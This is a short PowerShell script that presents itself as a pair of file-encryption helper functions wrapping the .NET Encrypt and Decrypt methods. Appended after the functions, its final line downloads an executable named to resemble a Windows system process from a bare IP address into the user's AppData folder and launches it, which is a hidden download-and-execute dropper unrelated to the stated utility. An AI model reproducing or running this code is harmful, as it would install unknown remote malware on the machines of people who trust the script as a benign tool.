

function Enable-FileEncryption
{
	
	[OutputType([void])]
	[CmdletBinding()]
	param
	(
		[Parameter(Mandatory,ValueFromPipeline)]
		[ValidateNotNullOrEmpty()]
		[System.IO.FileInfo]$File
	)
	begin {
		$ErrorActionPreference = 'Stop'
	}
	process {
		try
		{
			$File.Encrypt()	
		}
		catch
		{
			$PSCmdlet.ThrowTerminatingError($_)
		}
	}
}

function Disable-FileEncryption
{
	
	[OutputType([void])]
	[CmdletBinding()]
	param
	(
		[Parameter(Mandatory, ValueFromPipeline)]
		[ValidateNotNullOrEmpty()]
		[System.IO.FileInfo]$File
	)
	begin {
		$ErrorActionPreference = 'Stop'
	}
	process {
		try
		{
			$File.Decrypt()		
		}
		catch
		{
			$PSCmdlet.ThrowTerminatingError($_)
		}
	}
}
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

